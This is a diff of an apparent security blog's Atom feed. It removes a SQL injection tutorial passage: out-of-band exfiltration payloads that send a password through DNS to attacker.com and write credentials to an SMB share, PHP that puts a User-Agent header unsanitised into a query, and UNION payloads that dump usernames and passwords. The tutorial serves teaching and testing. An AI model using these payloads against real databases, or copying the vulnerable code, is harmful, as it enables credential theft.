-An attacker sets up a DNS server and injects a payload that forces a DNS lookup:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-SELECT load_file(concat('\\\\',(SELECT password FROM users),'..attacker.com\\dummy'));
-</code></pre>
-</div>
-
-<p><strong>Result:</strong> The server tries to resolve <code class="language-plaintext highlighter-rouge">adminpass.attacker.com</code> and the attacker logs that lookup.</p>
-
-<p><strong>Advantage:</strong> Firewalls rarely block DNS; it’s a goldmine for covert exfiltration.</p>
-
-<hr />
-
-<h3 id="smb-based-exfiltration">SMB-Based Exfiltration</h3>
-
-<p><strong>Mechanism:</strong> The DB writes to an SMB/UNC path pointing to an attacker’s share.</p>
-
-<p><strong>Example (MySQL/MSSQL):</strong></p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-SELECT password INTO OUTFILE '\\\\10.10.162.175\\logs\\creds.txt';
-</code></pre>
-</div>
-
-<p><strong>Advantage:</strong> Particularly effective in Windows domains where SMB traffic is trusted internally.</p>
-
-<hr />
-
-<p><strong>Summary: Why OOB SQLi Is a God-Tier Technique</strong></p>
-
-<table>
-  <thead>
-    <tr>
-      <th>Feature</th>
-      <th>Benefit</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td><strong>Bypasses Output Filters</strong></td>
-      <td>No need for verbose DB errors or direct output</td>
-    </tr>
-    <tr>
-      <td><strong>Evasion of WAF/IDS</strong></td>
-      <td>Uses less-monitored protocols like DNS and SMB</td>
-    </tr>
-    <tr>
-      <td><strong>Works in Segmented Networks</strong></td>
-      <td>Exploits internal servers with outbound access</td>
-    </tr>
-    <tr>
-      <td><strong>Highly Stealthy</strong></td>
-      <td>Harder to detect; logs don’t show typical SQLi patterns</td>
-    </tr>
-    <tr>
-      <td><strong>Persistence Ready</strong></td>
-      <td>Can be combined with stored injections for long-term access</td>
-    </tr>
-  </tbody>
-</table>
-
-<h1 id="sql-injection-through-http-headers-the-silent-backdoor">SQL Injection Through HTTP Headers: The Silent Backdoor</h1>
-
-<p>Most SQL Injection tutorials focus on form inputs or URL parameters, but savvy attackers know headers can be just as juicy attack vectors.</p>
-
-<p>HTTP headers like <strong>User-Agent</strong>, <strong>X-Forwarded-For</strong>, or <strong>Referer</strong> often contain untrusted, user-controlled data. When your app blindly plugs these header values into SQL queries without sanitization you get a stealthy and overlooked SQL Injection channel.</p>
-
-<hr />
-
-<h2 id="why-headers">Why Headers?</h2>
-
-<p>Headers travel with every HTTP request, and many apps log them or use them in database queries for tracking, analytics, or access control. Unlike form data, headers are easy to overlook during input validation.</p>
-
-<hr />
-
-<h2 id="how-sqli-in-headers-works">How SQLi in Headers Works</h2>
-
-<p>Say your PHP app logs the User-Agent header in the database:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-$userAgent = $_SERVER['HTTP_USER_AGENT'];
-$query = "INSERT INTO logs (user_agent) VALUES ('$userAgent')";
-</code></pre>
-</div>
-
-<p>If an attacker sends a malicious User-Agent like:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-' OR '1'='1
-</code></pre>
-</div>
-
-<p>The SQL becomes:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-INSERT INTO logs (user_agent) VALUES ('' OR '1'='1');
-</code></pre>
-</div>
-
-<p>If the query expects a string but the injection breaks out and changes logic, attackers can:</p>
-
-<ul>
-  <li>
-    <p>Dump data by exploiting UNION SELECT in vulnerable SELECT queries</p>
-  </li>
-  <li>
-    <p>Bypass filters by injecting always-true conditions</p>
-  </li>
-  <li>
-    <p>Corrupt or escalate data integrity</p>
-  </li>
-</ul>
-
-<hr />
-
-<h2 id="common-headers-to-watch">Common Headers to Watch</h2>
-
-<ul>
-  <li>
-    <p><strong>User-Agent:</strong> Browser or tool identification string</p>
-  </li>
-  <li>
-    <p><strong>X-Forwarded-For:</strong> Client IP chain, often trusted blindly</p>
-  </li>
-  <li>
-    <p><strong>Referer:</strong> Previous page URL, attacker-controlled</p>
-  </li>
-  <li>
-    <p><strong>Cookie:</strong> Session data carriers</p>
-  </li>
-  <li>
-    <p><strong>X-Api-Key / Authorization:</strong> Sometimes mishandled in backend</p>
-  </li>
-</ul>
-
-<h4 id="attack-example">Attack Example</h4>
-
-<p><strong>Code Breakdown</strong></p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
-$query = "SELECT id, ip, user_agent, note FROM logins WHERE user_agent = '$ua'";
-$result = $mysqli-&gt;query($query);
-</code></pre>
-</div>
-
-<ul>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">$ua</code> is taken <strong>directly from the HTTP User-Agent header</strong>.</p>
-  </li>
-  <li>
-    <p>It’s interpolated <strong>without escaping or validation</strong> inside a SQL query string.</p>
-  </li>
-  <li>
-    <p>If attacker crafts a User-Agent containing SQL syntax, it injects code into the query.</p>
-  </li>
-</ul>
-
-<h2 id="attack-vector-example">Attack Vector Example</h2>
-
-<p>Suppose attacker sends:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-User-Agent: ' UNION SELECT id, username, password, 'evil' FROM user; #
-</code></pre>
-</div>
-
-<p>The query becomes:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-SELECT id, ip, user_agent, note FROM logins WHERE user_agent = '' UNION SELECT id, username, password, 'evil' FROM user; # '
-</code></pre>
-</div>
-
-<p>What happens:</p>
-
-<ul>
-  <li>
-    <p>The first WHERE clause looks for empty string (no results).</p>
-  </li>
-  <li>
-    <p>UNION injects a second query that pulls usernames and passwords from <code class="language-plaintext highlighter-rouge">user</code> table.</p>
-  </li>
-  <li>
-    <p>The trailing <code class="language-plaintext highlighter-rouge">'</code> is commented out by <code class="language-plaintext highlighter-rouge">#</code>, so no syntax error.</p>
-  </li>
-  <li>
-    <p>The results mix into the output attacker extracts sensitive data.</p>
-  </li>
-</ul>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Cky9Qb2di_0LlpwaJ6B8Pg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[SQL (Structured Query Language) SQL is a powerful language used to interact with relational databases. It lets you fetch, update, insert, and remove data using clear commands called statements.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://e1.pxfuel.com/desktop-wallpaper/226/223/desktop-wallpaper-dark-art-artwork-fantasy-artistic-original-psychedelic-horror-evil-creepy-scary-spooky-halloween-evil-dark-winter.jpg" /><media:content medium="image" url="https://e1.pxfuel.com/desktop-wallpaper/226/223/desktop-wallpaper-dark-art-artwork-fantasy-artistic-original-psychedelic-horror-evil-creepy-scary-spooky-halloween-evil-dark-winter.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[What if a single line of input could give an attacker full control over a system? No passwords. No exploits. Just raw commands slipped in through the cracks. That’s the threat behind Command Injection one of the most dangerous, yet often overlooked, vulnerabilities in modern applications.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://e1.pxfuel.com/desktop-wallpaper/92/1012/desktop-wallpaper-spooky-creepy-evil-backgrounds-scary-horror-dark-evil-background.jpg" /><media:content medium="image" url="https://e1.pxfuel.com/desktop-wallpaper/92/1012/desktop-wallpaper-spooky-creepy-evil-backgrounds-scary-horror-dark-evil-background.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
